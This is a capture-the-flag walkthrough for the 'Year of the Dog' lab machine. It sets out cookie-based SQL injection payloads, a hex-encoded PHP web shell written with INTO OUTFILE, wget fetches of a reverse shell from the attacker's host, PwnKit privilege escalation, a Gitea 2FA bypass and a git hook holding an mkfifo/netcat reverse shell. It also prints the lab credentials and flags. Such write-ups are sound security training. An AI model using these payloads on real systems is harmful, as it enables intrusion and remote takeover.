
## 11. Year of the Dog

```
nmap -sV -sC [Target_IP]
```

```
gobuster dir -u http://<IP> -w <wordlist>
```

```
feroxbuster -u http://10.49.134.39 -w dirbuster/wordlists/directory-list-2.3-medium.txt
```

Also run dirbuster where we found a page called config.php

Open burp suite and intercept the request of / 

![enum result](Assets/35.png)

Now in the cookie value add this

```
' or 1=1-- --
```

![enum result](Assets/36.png)

Now in my case the value 40 seems to be not changing as when we used to send requests earlier, it did changed

Now we will apply SQL injection in this cookie id

```
' UNION SELECT NULL-- --
```

Now add another NULL after this

```
' UNION SELECT NULL,NULL-- --
```

This tells us that we have two tables, now let us find the table name

Now we will check if 1 value is correct 

```
' UNION SELECT 1,NULL-- --
```

This one doesn't work so we will try on other one

```
' UNION SELECT NULL,1-- --
```

![enum result](Assets/37.png)


Now in this another query also works

```
' UNION SELECT NULL, version()-- --
```

This shows us ubuntu but we ran MySQL command which states the database is MySQL

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

In this we will pick our MySQL one

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md

![enum result](Assets/38.png)

We can LOAD a file in this 

```
' UNION SELECT NULL, LOAD_FILE('/etc/passwd')-- --
```


![enum result](Assets/39.png)

Mostly we have default paths in HTML configs which is 

```
/var/www/html/page_name
```

We earlier found a file called config.php, Now we will add this injection to access it

```
' UNION SELECT NULL, LOAD_FILE('/var/www/html/config.php')-- --
```

We found a username and its password

![enum result](Assets/40.png)

We have our username and password so we can try SSH login

```
ssh web@IP
```

Password- Cda3RsDJga

It didnt login

Now lets try something different

We will use them

![enum result](Assets/41.png)

Now we will pick the HEX one cuz it works

Its hex value is just a php code in hex format so we will create a file which has a netcat reverse shell in it

![enum result](Assets/42.png)

```
<?php system($_GET['x']);?>
```

Now if we convert this into hex and then if we are able to get this x into a file x.php then we can have a netcat reverse shell command too

![enum result](Assets/44.png)

Final SQLi looks like this

```
' UNION SELECT NULL,0x3c3f7068702073797374656d28245f4745545b2278225d293b203f3e into outfile '/var/www/html/z.php'-- --
```

![enum result](Assets/45.png)

Now we can run commands in it

I will run python server in my system and get my pentest monkey reverse shell file into this

```
python -m http.server 3030
```

In URL now after x= add this

```
wget http://tun0_IP:3030/revshell.php
```

Now we have revshell.php file here so lets run that

```
nc -lvnp 1234
```

In browser change file name to revshell.php

![enum result](Assets/46.png)

Now we are inside the machine

``` 
cat /home/dylan/user.txt
```

We see an access denied bcuz we are not dylan, we are www-data

We have another file ```work_analysis ```

If we cat in this file we can see something

![enum result](Assets/47.png)

```
cat work_analysis | grep dylan
```

We found dylan's password

```
Labr4d0rs4L1f3
```

Let us try ssh login into this

```
ssh dylan@IP
```

![enum result](Assets/48.png)

Now cat dylan's user.txt file

```
THM{OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji}
```

#### Privilege Escalation - Method -1

There will be two methods we will try first the PwnKit one

First we need to get Linus Privilege escalation tool into the victim's machine

https://github.com/The-Z-Labs/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh

In dylan's machine

Copy the code from linux-exploit-suggester

```
nano shell.sh
```

Paste the code

```
chmod +x shell.sh
```

```
./shell.sh
```

Now we found a vulnerability and also that we can run Pwnkit

![enum result](Assets/64.png)

Download PwnKit

```
git clone https://github.com/ly4k/PwnKit
```

Now in Pwnkit we will send its PwnKit.sh file into victim's system

![enum result](Assets/65.png)

```
python3 -m http.server 3030
```

In Victim's machine

```
wget http://192.168.132.222:3030/PwnKit
```

```
chmod +x PwnKit
```

```
./PwnKit
```

It takes time but Now we are root here

```
whoami
```

![enum result](Assets/66.png)

```
cat /root/root.txt
```

![enum result](Assets/67.png)

```
THM{MzlhNGY5YWM0ZTU5ZGQ0OGI0YTc0OWRh}
```
#### Privilege Escalation - Method -2

![enum result](Assets/49.png)

Everything is okay in this we have to take a different path now

```
ls -la
```

Here .gitconfig looks different, lets check it out

```
cat .gitconfig
```

![enum result](Assets/60.png)

Now we dont have much clue so we will find if there is anything running on the localhost system on any port

```
netstat -ant | grep -i listen
```

- **`-a`** → show **all** sockets (both listening ports and established connections)

- **`-n`** → show **numeric** addresses & ports (don’t try to resolve hostnames or service names)

- **`-t`** → show **TCP** connections only

![enum result](Assets/61.png)

In them I find that 3000 port different as we saw rest all already

```
curl http://127.0.0.1:3000 | grep git
```

Now we still dont have much but we can do ssh port forwarding

```
ssh dylan@10.48.134.10 -L 6789:127.0.0.1:3000
```

In this we are forwarding traffic of port 127.0.0.1:3000 of dylan to our localhost port 6789 

![enum result](Assets/62.png)

If we go to sign in, we will be needing password and email of dylan

```
dylan@yearofthedog.thm
```

```
Labr4d0rs4L1f3
```

Now we found an authentication page which we need to bypass

Right Click -> View Page Source

We found it is using Gitea version 1.13.0

![enum result](Assets/63.png)

Let us find a way to bypass this 2FA

Now while doing this room, I deleted the table called two-factor responsible for 2FA but still it didnt work, I also created another user, gave it admin permission but still wasn't able to go to admin panel, so we will try second approach using burp suite

Turn on Burp suite intercept and turn on the Foxyproxy with it

In our machine do this

```
curl http://dylan:Labr4d0rs4L1f3@127.0.0.1:6789 -x http://127.0.0.1:8080
```

Now if we go to intercept we found a get request to 127.0.0.1:6789 which has an auth token with it

![enum result](Assets/68.png)

Right Click --> Request in Browser --> In Current session

Copy it, open the browser, turn off foxyproxy and paste it in the browser

We are in dylan's page

![enum result](Assets/69.png)

Now do one more thing fast

Go to proxy settings --> Match and replace --> In replace add Authorization: Basic (token)

![enum result](Assets/70.png)

We get this Site Administration

![enum result](Assets/71.png)

In dylan's repo, Click on Settings -> Git hooks

In this I found a script so let us change this script 

We will add a bash reverse shell and run this to get a reverse shell access

```
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```

![enum result](Assets/73.png)

After !/bin/sh add

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.132.222 1234 >/tmp/f
```

Add this and click update

Now we will go to our test repo

Now in dylan's shell

```
cd /tmp
```

```
git clone http://localhost:3000/Dylan/Test-Repo.git
```

```
cd Test-Repo
```

```
ls -la
```

![enum result](Assets/74.png)

Now we will update README.md file, push our update to have our reverse shell access

![enum result](Assets/76.png)

![enum result](Assets/75.png)

![enum result](Assets/77.png)

![enum result](Assets/78.png)

After this we get our reverse shell 

```
cd .ssh
```

```
ls -la
```

```
cat environment
```

```
sudo -l
```

```
sudo su
```

Now we are root
